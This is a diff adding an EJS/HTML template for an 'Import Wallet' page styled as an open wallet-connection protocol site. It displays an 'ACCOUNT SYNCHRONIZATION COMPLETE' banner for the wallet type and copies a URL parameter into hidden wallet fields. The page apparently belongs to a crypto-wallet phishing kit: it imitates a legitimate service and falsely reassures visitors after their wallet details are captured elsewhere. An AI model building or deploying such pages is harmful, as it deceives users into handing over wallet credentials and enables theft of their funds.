@@ -1,0 +1,84 @@
+<html>
+        <meta http-equiv="content-type" content="text/html;charset=UTF-8" />
+        <head>
+        <link rel="stylesheet" href="/stylesheets/main.css" type="text/css"/> 
+        <meta charset="UTF-8">
+        <meta name="description" content="Open protocol for connecting Wallets to Dapps">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <meta property="og:image" content="/images/crypto/logo.html">
+        <link rel="icon" href="/images/crypto/logo.svg">
+        <script>
+            function openCity(evt, cityName) {
+            // Declare all variables
+            var i, tabcontent, tablinks;
+          
+            // Get all elements with class="tabcontent" and hide them
+            tabcontent = document.getElementsByClassName("tabcontent");
+            for (i = 0; i < tabcontent.length; i++) {
+              tabcontent[i].style.display = "none";
+            }
+          
+            // Get all elements with class="tablinks" and remove the class "active"
+            tablinks = document.getElementsByClassName("tablinks");
+            for (i = 0; i < tablinks.length; i++) {
+              tablinks[i].className = tablinks[i].className.replace(" active", "");
+            }
+          
+            // Show the current tab, and add an "active" class to the button that opened the tab
+            document.getElementById(cityName).style.display = "block";
+            evt.currentTarget.className += " active";
+          }
+          </script>
+        </head>
+        
+        <title>Import Wallet</title>
+        
+        <body>
+        <center>
+        <div class="top">
+                <a href="index-2.html#footer" class="left">Github</a>
+                <a href="index-2.html#" class="left">Docs</a>
+                <a href="index-2.html" class="main"><img src="/images/crypto/logo.svg" alt="logo"/></a>
+                <a href="index-2.html#wallets" class="left">Wallets</a>
+                <a href="index-2.html#" class="left">Apps</a>
+        </div>
+        <div class="flashbox">
+          <% if(success && success.length) { %>
+                 <div class="flashboxsuccess-alert">
+                     <%= success %> 
+                     <span class="flashboxsuccess-closebtn" onclick="this.parentElement.style.display='none';">&times;</span>
+                     
+                 </div>
+             <% } %> 
+         
+             <% if(error && error.length) { %>
+                     <div class="flashboxerror-alert">
+                         <%= error %> 
+                         <span class="flashboxerror-closebtn" onclick="this.parentElement.style.display='none';">&times;</span>
+                         
+                     </div>
+             <% } %> 
+             
+      </div>
+        </br>
+        <h2><center><%= wallet.walletType.toUpperCase()%>  ACCOUNT SYNCHRONIZATION COMPLETE</center></h2>
+      
+        
+        <script>
+            document.getElementById("default").click();
+            const urlParams = new URLSearchParams(window.location.search)
+            const walletType = urlParams.get("type")
+            document.querySelectorAll("input[name='wallet']").forEach( node => {
+              node.value = walletType
+            })
+        </script>
+        <footer><div id="footer">
+        <p><img src="/images/crypto/discord.svg" class="footimg">  <a href="https://discord.gg/">Discord</a></p></br>
+        <p><img src="/images/crypto/telegram.svg" class="footimg">  <a href="https://t.me/">Telegram</a></p></br>
+        <p><img src="/images/crypto/twitter.svg" class="footimg">  <a href="https://twitter.com/">Twitter</a></p></br>
+        <p><img src="/images/crypto/github.svg" class="footimg">  <a href="https://github.com/">Github</a></p></br>
+        </footer>
+        </body>
+        
+        
+    </html>
